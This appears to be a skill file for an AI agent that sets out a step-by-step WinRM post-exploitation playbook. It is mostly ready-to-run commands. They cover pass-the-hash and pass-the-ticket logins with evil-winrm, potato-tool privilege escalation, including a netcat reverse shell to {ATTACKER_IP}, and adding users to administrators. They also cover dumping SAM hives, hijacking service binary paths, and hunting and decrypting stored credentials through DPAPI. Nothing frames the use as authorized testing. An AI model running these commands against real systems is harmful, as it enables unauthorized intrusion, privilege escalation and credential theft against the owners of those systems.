---
name: winrm
description: WinRM access and post-exploitation (ports 5985, 5986). Use when port 5985 or 5986 is open and you have credentials or a hash. Covers evil-winrm, post-shell enumeration, privilege escalation from shell, token privileges, DPAPI, credential hunting.
user-invocable: false
allowed-tools: Read
---

# WinRM — Ports 5985 (HTTP) / 5986 (HTTPS)

## Step 1 — verify access
```bash
nxc winrm {IP} -u '{USER}' -p '{PASS}'                    # Pwn3d! = shell available
nxc winrm {IP} -u '{USER}' -H {NT_HASH}                   # PTH
nxc winrm {IP} -u '{USER}' -p '{PASS}' -x whoami          # quick exec
```
Only users in **Remote Management Users** group (or local admins) can use WinRM.

## Step 2 — get shell
```bash
evil-winrm -i {IP} -u '{USER}' -p '{PASS}'
evil-winrm -i {IP} -u '{USER}' -H {NT_HASH}                   # Pass-the-Hash
evil-winrm -i {IP} -u '{USER}' -p '{PASS}' -S                 # HTTPS (5986)
evil-winrm -i {IP} -u '{USER}' -p '{PASS}' -r {DOMAIN}        # Kerberos realm (PTT)

# With Kerberos ticket (Pass-the-Ticket)
export KRB5CCNAME={USER}.ccache
evil-winrm -i {DC_FQDN} -r {DOMAIN}                           # must use FQDN not IP
```

## Step 3 — immediate post-shell checklist (run these first, always)
```bash
whoami                                                         # current user
whoami /priv                                                   # token privileges — check SeImpersonate
whoami /groups                                                 # group memberships
net user {USER} /domain                                        # full user info
net localgroup administrators                                  # local admins on this box
hostname; ipconfig /all                                        # machine name, network
systeminfo | findstr /i "os name\|domain\|hotfix"             # OS version, patches
```

## Step 4 — SeImpersonatePrivilege (almost always present on service accounts)
```bash
whoami /priv
# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is Enabled:

# GodPotato (broadest compat — Server 2012 to 2022, Windows 10/11)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net localgroup administrators {USER} /add"
.\GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe {ATTACKER_IP} 443 -e cmd"

# PrintSpoofer (Server 2019, 2022, Windows 10)
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "net localgroup administrators {USER} /add"

# JuicyPotatoNG (alternative)
.\JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c whoami"

# SweetPotato
.\SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c whoami"
```

## Step 5 — group membership privilege escalation
```bash
net user {USER} /domain                                        # check all group memberships

# Backup Operators → dump NTDS.dit
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\sys.hive
reg save HKLM\SECURITY C:\Temp\sec.hive
# Download and run locally:
secretsdump.py.py -sam sam.hive -system sys.hive -security sec.hive LOCAL

# Server Operators → SYSTEM via service modification
sc config {SERVICE} binpath= "cmd /c net localgroup administrators {USER} /add"
sc stop {SERVICE} && sc start {SERVICE}
# Safe services: VSS, wuauserv, AppReadiness

# DNSAdmins → SYSTEM on DC via DLL injection (see lateral-movement skill)

# Account Operators → create users, modify groups (except DA, Schema Admins)
```

## Step 6 — credential hunting from shell
```bash
# Stored Windows credentials
cmdkey /list
dir C:\Users\{USER}\AppData\Roaming\Microsoft\Credentials\
dir C:\Users\{USER}\AppData\Local\Microsoft\Credentials\

# PowerShell history
type C:\Users\{USER}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Interesting config files
dir C:\ /s /b 2>nul | findstr /i "web.config appsettings.json .ini .conf"
type C:\inetpub\wwwroot\web.config
findstr /si password *.xml *.ini *.txt *.config C:\

# Registry — AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"             # PuTTY saved sessions

# Scheduled tasks running as other users
schtasks /query /fo LIST /v | findstr /i "run as\|task name"

# Services running as domain accounts
wmic service get name,startname | findstr /i {DOMAIN}
Get-WmiObject Win32_Service | Where-Object {$_.StartName -like "*{DOMAIN}*"} | Select Name,StartName
```

## Step 7 — DPAPI credential extraction
```bash
# Remote collection from Linux (most complete)
donpapi collect --dc-ip {IP} -d {DOMAIN} -u '{USER}' -p '{PASS}'
donpapi collect --dc-ip {IP} -d {DOMAIN} -u '{USER}' -H {NT_HASH}
donpapi --browsers collect --dc-ip {IP} -d {DOMAIN} -u '{USER}' -p '{PASS}'  # + browser creds

# Manual DPAPI from shell
# List masterkeys
dir C:\Users\{USER}\AppData\Roaming\Microsoft\Protect\{SID}\

# Decrypt masterkey
dpapi.py masterkey -file {MK_FILE} -sid {SID} -password '{PASS}'

# Decrypt credential blob
dpapi.py credential -file {CRED_FILE} -key {MASTERKEY}
```

## Step 8 — file upload/download with evil-winrm
```bash
# Upload
upload /path/to/local/file.exe C:\Temp\file.exe

# Download
download C:\Windows\System32\config\SAM /tmp/SAM

# Built-in evil-winrm features
menu                                                           # show available modules
Invoke-Binary /path/to/binary.exe                             # run .NET binary in memory
```

## Gotchas
- **Port 5985 open but can't connect** → user not in Remote Management Users or local admins
- **SeImpersonatePrivilege** → almost always present on service accounts (IIS AppPool, MSSQL, etc.); check first
- **HTTPS (5986)** → add `-S` flag and possibly `-P {PASSPHRASE}` for client cert
- **Kerberos auth via evil-winrm** → must use FQDN, not IP; export KRB5CCNAME first
- **evil-winrm upload/download** → transfers files in current working directory context
- **Backup Operators** → can dump SAM but NOT NTDS.dit directly via reg save; need diskshadow for NTDS
- **Server Operators** → can modify services but service must be stoppable; pick a safe one
- **ConPTY shell** → evil-winrm gives a semi-interactive shell; some tools need a full PTY
